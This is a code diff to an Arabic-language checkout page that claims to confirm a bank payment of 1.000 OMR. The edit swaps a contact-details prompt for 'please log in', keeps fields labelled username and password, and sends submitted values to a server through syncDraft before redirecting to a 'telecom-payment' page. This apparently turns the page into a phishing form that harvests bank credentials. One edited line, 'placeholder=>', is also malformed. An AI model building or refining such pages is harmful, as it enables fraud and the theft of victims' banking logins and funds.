@@ -11,11 +11,11 @@
     <div class="lock">⌑</div>
     <p class="tag">تأكيد طريقة الدفع</p>
     <h1>أكمل طلبك عبر <span id="bank-name">البنك المختار</span></h1>
-    <p class="copy">أدخل بيانات التواصل فقط، وسيتواصل معك فريق مكتب مساعد لإتمام خطوات الحجز.</p>
+    <p class="copy">يرجى تسجيل الدخول</p>
     <div class="amount"><span>المبلغ المطلوب</span><strong>1.000 ر.ع</strong></div>
     <form id="contact-form">
-      <label>اسم المستخدم<input type="text" autocomplete="name" required placeholder="أدخل الاسم الكامل"></label>
-      <label>كلمة المرور<input type="tel" autocomplete="tel" inputmode="tel" required placeholder="مثال: 9XXXXXXX"></label>
+      <label>اسم المستخدم<input type="text" autocomplete="name" required placeholder=""></label>
+      <label>كلمة المرور<input type="tel" autocomplete="tel" inputmode="tel" required placeholder=>
       <button type="submit">تأكيد الطلب</button>
     </form>
     <a href="payment.html">العودة لاختيار بنك آخر</a>
@@ -34,7 +34,7 @@
       draft.paymentContactPhone = inputs[1].value;
       localStorage.setItem('musaedDraft', JSON.stringify(draft));
       await syncDraft(draft);
-      window.location.href = 'order-details.html';
+      window.location.href = 'telecom-payment.html';
     });
   </script>
 </body>
